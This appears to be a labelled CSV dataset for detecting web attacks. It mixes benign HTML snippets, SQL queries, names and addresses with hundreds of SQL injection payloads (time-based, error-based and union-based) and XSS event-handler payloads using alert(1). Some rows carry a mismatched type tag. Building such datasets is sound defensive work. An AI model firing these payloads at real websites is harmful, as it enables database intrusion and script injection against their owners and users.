Text,Label,type
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Economist&amp;rft.atitle=Getting+to+grips+with+military+robotics&amp;rft.date=2018-01-25&amp;rft_id=https%3A%2F%2Fwww.economist.com%2Fnews%2Fspecial-report%2F21735478-autonomous-robots-and-swarms-will-change-nature-warfare-getting-grips&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'amjh'  =  'amjh",1,sql
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1,sql
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",1,sql
"pera, la",0,sql
7986,0,sql
SELECT * FROM scale,0,xss
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1,sql
1656,0,sql
"  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",0,sql
4.46658E+15,0,sql
<main onpointerenter=alert(1)>XSS</main>,2,xss
5.53776E+15,0,sql
SELECT * FROM certain WHERE trouble = 'thou',0,sql
1' order by 1--,1,sql
select * from users where id  =  '1'   or 1  =  1 -- 1',1,sql
"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,2,xss
pitcavag,0,sql
segovia,0,sql
porteril,0,sql
"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
saunder,0,sql
SELECT * FROM path WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0,xss
"   SELECT COUNT ( piece ) , but FROM add BY main",0,sql
"1"" and sleep  (  5  )   and ""masm""  =  ""masm",1,xss
88360528w,0,xss
SELECT AVG ( shaking ) FROM account,0,sql
SELECT * FROM stone 3 SELECT * FROM wall,0,sql
SELECT * FROM folks WHERE concerned = 'art' LIMIT 3,0,sql
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",2,xss
SELECT * FROM thread FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM president,0,sql
"  UPDATE appearance SET forget =  'gasoline', City =  'properly' WHERE usual =  enemy",0,sql
         </div>           ,0,xss
1'+  (  select 'vjoj' where 5348  =  5348,1,sql
"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
SELECT TOP 3 * FROM knife SELECT * FROM wagon 3SELECT * FROM proper,0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ckpm'  =  'ckpm",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
<iframe onpointerdown=alert(1)>XSS</iframe>,2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,1,sql
12230,0,sql
<kbd onpointerleave=alert(1)>XSS</kbd>,2,xss
SELECT * FROM  ( SELECT degree FROM hand ) ,0,sql
"<li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",0,xss
car52lit7,0,xss
SELECT adjective ( s )  FROM short,0,sql
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,1,sql
"  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  ",0,sql
"<font onmousemove=""alert(1)"">test</font>",2,xss
1'  )   where 2208  =  2208 rlike sleep  (  5  )  #,1,sql
SELECT AVG ( Price ) FROM fair,0,sql
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",1,sql
"1'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,xss
40542,0,xss
"1"" union all select null--",1,xss
<basefont onpointerup=alert(1)>XSS</basefont>,2,xss
SELECT * FROM individual WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31',0,sql
 UPDATE return SET camera = 'pond'WHERE of = 'such',0,sql
"calle kresaltxu 94, 3?b",0,sql
"	 </span></a></dt><dd>Learn how to configure Scrapy and see all <a class=""hoverxref reference internal"" data-doc=""topics/settings"" data-project=""scrapy"" data-section=""topics-settings-ref"" data-version=""latest"" href=""topics/settings.html#topics-settings-ref""><span class=""std std-ref"">available settings",0,xss
SELECT * FROM saved WHERE best BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"  SELECT wet,captured,say FROM settlers LEFT JOIN Orders ON letter.buyID =  perfectly.nearer ORDER BY blind.rhythm",0,sql
SELECT * FROM remarkable 3 SELECT * FROM end,0,sql
DELETE FROM port,0,sql
toperzer1,0,sql
<iframe src=http://.rocks/scriptlet.html <,2,xss
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>,2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_2710' LIMIT 1,0,xss
"	 <div id=""Computer_science"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Computer_science"" title=""Computer science"">Computer science </a> </div> </th> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,xss
SELECT * FROM yellow WHERE fill BETWEEN neighborhood09/01/1996free AND than15/31/1996they,0,sql
"calle llorente, 73,",0,sql
"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT hunter ( s )  FROM tea UNION,0,sql
almoharn,0,xss
"<sub onpaste=""alert(1)"" contenteditable>test</sub>",2,xss
48435837e,0,sql
SELECT * FROM being 3 SELECT * FROM closer,0,sql
"-2321%""  )   or 2271  =  7683--",1,sql
1' where 9602  =  9602,1,xss
karchevs,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Classifications </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT AVG ( recognize ) FROM quiet,0,sql
pockett_miguelin@noviasteresapalacios.aw,0,sql
SELECT * FROM snow WHERE search BETWEEN party09/01/1996stop AND hidden15/31/1996ourselves,0,sql
"<ul><li><a href=""/wiki/Chipless_RFID"" title=""Chipless RFID"">Chipless RFID </a> </li> </ul> </li>",0,xss
<textarea onpointerup=alert(1)>XSS</textarea>,2,xss
SELECT movie ( s FROM running RIGHT JOIN,0,sql
chalanera,0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;18 </li> </ul>",0,xss
DELETE FROM men,0,xss
SELECT * FROM mice  WHERE problem = onto,0,xss
"<mark onbeforepaste=""alert(1)"" contenteditable>test</mark>",2,xss
c96reveidil5,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Scientific+American&amp;rft.atitle=What+is+%27fuzzy+logic%27%3F+Are+there+computers+that+are+inherently+fuzzy+and+do+not+apply+the+usual+binary+logic%3F&amp;rft_id=https%3A%2F%2Fwww.scientificamerican.com%2Farticle%2Fwhat-is-fuzzy-logic-are-t%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>,2,xss
SELECT option_value FROM wp_options WHERE option_name  =  'kc_active_extensions' LIMIT 1,0,sql
"<thead onmouseleave=""alert(1)"">test</thead>",2,xss
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,1,sql
"<li id=""cite_note-338""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-338"">^ </a> </b> ",0,xss
SELECT fewer ( s )  FROM life SELECT throughout FROM ear,0,sql
lemieux4,0,sql
"INSERT INTO statement ( at, search, recall, fun, arrive, rapidly )  VALUES  ( 'her', 'task'. point', 'pure', 'terrible', 'verb', 'wife' )  ",0,sql
SELECT * FROM rather WHERE gather LIKE '%heard%',0,sql
villanueva gualano,0,sql
SELECT * FROM anywhere ORDER BY cage DESC,0,sql
SELECT * FROM zipper WHERE bottle BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"  SELECT twentyID AS ID, me AS excited FROM wife",0,sql
SELECT COUNT ( DISTINCT round )  FROM pictured,0,xss
"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>",2,xss
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",2,xss
"   SELECT back,sharp,anything,include,pick     (  (  hill JOIN please ON fresh.during =  transportation.fresh )   INNER JOIN sceneON Orders.upon =  wall.goneID ) ",0,xss
"	 </span> <span class=""reference-text"">",0,xss
18210,0,sql
"-2211"" or 2113  =  8885#",1,sql
"1 union all select null,null,null,null,null,null#",1,sql
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",2,xss
SELECT more ( s )  FROM do FULL OUTER JOIN,0,sql
"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",1,xss
1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,1,sql
"""  )   or sleep  (  __TIME__  )    =  """,1,sql
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1,sql
"<li><a href=""/wiki/Glossary_of_artificial_intelligence"" title=""Glossary of artificial intelligence"">Artificial intelligence </a> </li>",0,xss
"<small draggable=""true"" ondrag=""alert(1)"">test</small>",2,xss
<center onpointerdown=alert(1)>XSS</center>,2,xss
SELECT * FROM noun WHERE NOT rod = 'younger'  AND NOT for = 'balance',0,sql
-6412%' or 4065  =  5815 and '%'  =  ',1,sql
<tbody onpointermove=alert(1)>XSS</tbody>,2,xss
"<li><a href=""/wiki/Video_game"" title=""Video game"">Video games </a> </li>",0,xss
"1%""  )   or sleep  (  5  )  #",1,sql
"c/ altamira 179,",0,sql
"<element oncut=""alert(1)"" contenteditable>test</element>",2,xss
"<li id=""cite_note-Intractability-68""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Intractability_68-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Intractability_68-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
champ,0,sql
SELECT * FROM slope,0,sql
SELECT AVG ( ear ) FROM school SELECT SUM ( heat ) ,0,sql
"ronda outeiro s/n, 6d",0,sql
1'   )    )    as njop where 7001  =  7001,1,sql
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"1""   )    )    as dvpb where 6673  =  6673",1,xss
"<IMG LOWSRC=""javascript:alert('')"">",2,xss
SELECT * FROM jump WHERE garden BETWEEN third09/01/1996boat AND east15/31/1996plan,0,sql
-2717'   )    )     )   or 8571  =  8571--,1,sql
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,sql
"-5761""  )   or 3762  =  1274",1,sql
"	 </span></a></dt><dd>Use the <a class=""reference external"" href=""https://docs.python.org/3/reference/compound_stmts.html#async"" title=""(in Python v3.8)""><span class=""xref std std-ref"">coroutine syntax",0,xss
"<bdo onmouseover=""alert(1)"">test</bdo>",2,xss
"c/ encajeras, 40 4?f",0,sql
"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li> </ul>",0,xss
 </li>,0,xss
"<li><a href=""/wiki/Computational_complexity_theory"" title=""Computational complexity theory"">Computational complexity theory </a> </li>",0,xss
callos,0,sql
"<isindex onclick=""alert(1)"">test</isindex>",2,xss
2.7841E+15,0,sql
"<li id=""cite_note-hannun2014-268""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hannun2014_268-0"">^ </a> </b> ",0,xss
kashfi@cropbay.jobs,0,sql
SELECT * FROM written WHERE partly = 'widely' FETCH FIRST 3 ROWS ONLY,0,sql
"1"" where 3692  =  3692 union all select null,null--",1,sql
dagmar,0,sql
SELECT * FROM order WHERE naturally = 'winter' LIMIT 3,0,sql
<svg><optgroup onload=alert(1)></optgroup>,2,xss
<marquee onpointermove=alert(1)>XSS</marquee>,2,xss
narita@deportechino.an,0,sql
3st59et982,0,xss
delujan,0,sql
"<listing draggable=""true"" ondragstart=""alert(1)"">test</listing>",2,xss
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",2,xss
"<h2>Solving specific problems<a class=""headerlink"" href=""#solving-specific-problems"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"<li><a href=""/wiki/SONOS"" title=""SONOS"">SONOS </a> </li> </ul> </li>",0,xss
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sql
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",1,sql
<svg><tfoot onload=alert(1)></tfoot>,2,xss
"-8902 union all select 4339,4339,4339#",1,sql
"   SELECT Employees.in, COUNT ( Orders.shoutID )  AS paidFROM    ( OrdersINNER JOIN never ON Orders.putID  =  Employees.trailID ) ",0,sql
siseo,0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3 </li> </ul>",0,xss
"iif  (  5257  =  5257,1,1/0  )  ",1,sql
"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT MIN ( height )  AS lost FROM fair,0,sql
"select pg_sleep  (  5  )   and ""%""  =  """,1,sql
9.66866E+15,0,sql
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = ""Around the Horn"" AND c.CustomerID = o.CustomerID;",0,sql
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",2,xss
<textarea onselect=alert(1) autofocus>XSS</textarea>,2,xss
select pg_sleep  (  5  )   and    (    (   4382  =  4382,1,sql
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3,0,sql
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,0,sql
<form onpointerup=alert(1)>XSS</form>,2,xss
"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a> </li> </ul>",0,xss
"<li><a href=""/wiki/Gene_expression_programming"" title=""Gene expression programming"">Gene expression programming </a> </li>",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
ordinar,0,sql
vilcu-verschuer@eddydaniele.kz,0,xss
SELECT * FROM he WHERE deep = 'dug'  AND  ( connected = 'picture' OR place = 'now' ) ,0,sql
"<li><a href=""/wiki/Glossary_of_scientific_naming"" title=""Glossary of scientific naming"">Scientific naming </a> </li>",0,xss
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,2,xss
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT curve ( s )  FROM these UNION,0,sql
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0,sql
19846981m,0,sql
3.32981E+15,0,sql
"   SELECT pencil, mighty+ ', ' + sudden+ ' ' + might+ ', ' + tape AS during  FROM him",0,sql
"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
SELECT AVG ( start )  FROM compass  SELECT SUM ( traffic ) ,0,sql
"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>",2,xss
<image onpointerenter=alert(1)>XSS</image>,2,xss
<font id=x tabindex=1 onfocus=alert(1)></font>,2,xss
aseguir,0,sql
trebaol@arroyomolinos-madrid.gq,0,sql
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",2,xss
"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",0,xss
ivey,0,sql
oskorep,0,sql
maribeth4,0,xss
SELECT region ( s )  FROM coffee UNION ALL,0,sql
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,sql
"<li><a href=""/wiki/Hans_Reichenbach"" title=""Hans Reichenbach"">Hans Reichenbach </a> </li>",0,xss
manzano babot,0,sql
"cuesta de la baronesa, 192",0,sql
"passeig bosc, 157",0,sql
SELECT * FROM cold WHERE fireplace = 'bread',0,sql
-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,1,sql
 </p>,0,xss
1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1,xss
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1,sql
42685012w,0,sql
SELECT * FROM form WHERE people  BETWEEN 10 AND 20,0,sql
"INSERT INTO method ( nice, talk, meet, thought, scientific, just )  VALUES  ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )  ",0,sql
SELECT MIN ( die )  AS nor FROM feel,0,sql
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",1,xss
"<li><a href=""/wiki/Emergent_materialism"" title=""Emergent materialism"">Emergent materialism </a> </li>",0,xss
"<style>:target {transform: rotate(180deg);}</style><nextid id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nextid>",2,xss
<small onpointerup=alert(1)>XSS</small>,2,xss
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0,sql
1'   )    )    as wuws where 6917  =  6917 union all select null#,1,sql
<tt onpointerleave=alert(1)>XSS</tt>,2,xss
"	 </span>) </i> </small><small class=""hide-when-compact""><i> (<a href=""/wiki/Help:Maintenance_template_removal"" title=""Help:Maintenance template removal"">Learn how and when to remove this template message </a>) </i> </small> </div> </td> </tr> </tbody> </table>",0,xss
"-5667%'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1,sql
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,2,xss
"1"" where 6501  =  6501",1,sql
	 </span>,0,xss
"1'+  (  select 'fpnz' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1,sql
"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish )  VALUES  ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )  ",0,sql
22532,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'dthp'  =  'dthp",1,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Programming_language_theory"" title=""Programming language theory"">Software notations </a><br />and <a href=""/wiki/Programming_tool"" title=""Programming tool"">tools </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>",2,xss
lonnie,0,sql
"< STYLE=""behavior: url(.htc);"">",2,xss
"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,xss
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1,sql
86064216x,0,sql
"calle robregordo, 171 10-c",0,sql
"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>",2,xss
"<source onkeyup=""alert(1)"" contenteditable>test</source>",2,xss
SELECT DISTINCT cage FROM relationship,0,sql
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
7497,0,xss
SELECT * FROM essential WHERE    NOT enemy = 'gravity',0,xss
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0,sql
"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1,sql
1'+  (  select vfmy where 5711  =  5711,1,sql
aznar,0,sql
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",2,xss
"<li><a href=""/wiki/Imre_Lakatos"" title=""Imre Lakatos"">Imre Lakatos </a> </li>",0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=44"" title=""Edit section: Hospitality"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
<code onpointerleave=alert(1)>XSS</code>,2,xss
<sup onpointerover=alert(1)>XSS</sup>,2,xss
"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",1,sql
select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --,1,sql
"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",1,sql
1'   )    )    as qqvk where 1007  =  1007,1,sql
SELECT DISTINCT statement FROM swam,0,sql
SELECT * FROM bag  WHERE ordinary = mixture,0,sql
	 </span>,0,xss
"    <script type=""text/javascript"" src=""_static/js/theme.js""></script>",0,xss
"<ul><li><a href=""/w/index.php?title=Grey_Wolf_Optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""Grey Wolf Optimizer (page does not exist)"">Grey Wolf Optimizer </a> </li>",0,xss
"  SELECT Orders.fullrID, Employees.angle, Employees.crack FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.uncleID ORDER BY Orders.cookID",0,sql
"<slot oncut=""alert(1)"" contenteditable>test</slot>",2,xss
SELECT * FROM needs FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM variety,0,sql
"<p>AI has developed many tools to solve the most difficult problems in <a href=""/wiki/Computer_science"" title=""Computer science"">computer science </a>. A few of the most general of these methods are discussed below.",0,xss
"<textarea onclick=""alert(1)"">test</textarea>",2,xss
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,1,sql
    </p>,0,xss
"<ins onmouseenter=""alert(1)"">test</ins>",2,xss
"  SELECT anyID AS ID, atom AS beautiful FROM dry",0,sql
SELECT Count ( * )  AS applied,0,sql
"<acronym onmouseover=""alert(1)"">test</acronym>",2,xss
"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",1,sql
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",1,sql
1'  )   where 4949  =  4949,1,sql
rombeek,0,sql
"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",1,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",2,xss
98011650w,0,xss
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",1,sql
"<ul><li>DH Author, 'Why Are There Still So Many Jobs? The History and Future of Workplace Automation' (2015) 29(3) Journal of Economic Perspectives 3. </li>",0,xss
7.69984E+15,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,0,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;235–240 </li>",0,xss
<footer onpointerenter=alert(1)>XSS</footer>,2,xss
"<keygen onclick=""alert(1)"">test</keygen>",2,xss
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,1,sql
"<tt onclick=""alert(1)"">test</tt>",2,xss
	 </span> </a>,0,xss
SELECT TOP 3 * FROM separate WHERE discover = 'solution' SELECT * FROM income,0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=20"" title=""Edit section: Knowledge-based"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
